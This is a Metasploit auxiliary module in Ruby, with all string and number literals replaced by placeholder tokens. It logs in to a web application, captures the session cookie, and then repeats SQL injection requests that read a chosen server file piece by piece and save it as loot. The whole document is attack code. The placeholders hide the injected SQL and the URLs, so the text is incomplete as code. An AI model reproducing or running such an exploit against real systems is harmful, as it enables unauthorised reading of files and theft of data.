require <str> class Metasploit4 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] ] , <str> = > { <str> = > true } , <str> = > [ <str> ] , <str> = > false , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def run print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path , <str> , <str> , <str> ) } ) unless res and res . code == <int> print_error ( <str> ) return end cookie = res . get_cookies if cookie . blank? print_error ( <str> ) return end post = { <str> = > <str> , <str> = > <str> , <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] , <str> = > Rex :: Text . encode_base64 ( datastore [ <str> ] ) } print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path , <str> , <str> , <str> ) , <str> = > <str> , <str> = > post , <str> = > cookie } ) unless res and res . code == <int> print_error ( <str> ) return end unless res . headers [ <str> ] && res . headers [ <str> ] == normalize_uri ( target_uri . path , <str> ) print_error ( <str> ) return end cookie = res . get_cookies if cookie . blank? print_error ( <str> ) return end i = <int> full = <str> filename = datastore [ <str> ] . unpack ( <str> ) [ <int> ] left_marker = Rex :: Text . rand_text_alpha ( <int> ) right_marker = Rex :: Text . rand_text_alpha ( <int> ) print_status ( <str> ) loop do file = sqli ( left_marker , right_marker , i , cookie , filename ) return if file . nil? break if file . empty? str = [ file ] . pack ( <str> ) full << str vprint_status ( str ) i = i + <int> end path = store_loot ( <str> , <str> , datastore [ <str> ] , full , datastore [ <str> ] ) print_good ( <str> + path ) end def sqli ( left_marker , right_marker , i , cookie , filename ) pay = <str> left_marker . unpack ( <str> ) [ <int> ] <str> pay << <str> filename <str> pay << <str> ( <int> * i ) + <int> <str> right_marker . unpack ( <str> ) [ <int> ] <str> pay << <str> get = { <str> = > pay , <str> = > <str> } res = send_request_cgi ( { <str> = > normalize_uri ( target_uri . path , <str> , <str> , <str> , <str> ) , <str> = > cookie , <str> = > get } ) if res and res . body and res . body =~ <str> left_marker <str> right_marker <str> return $1 else print_error ( <str> ) return nil end end end 
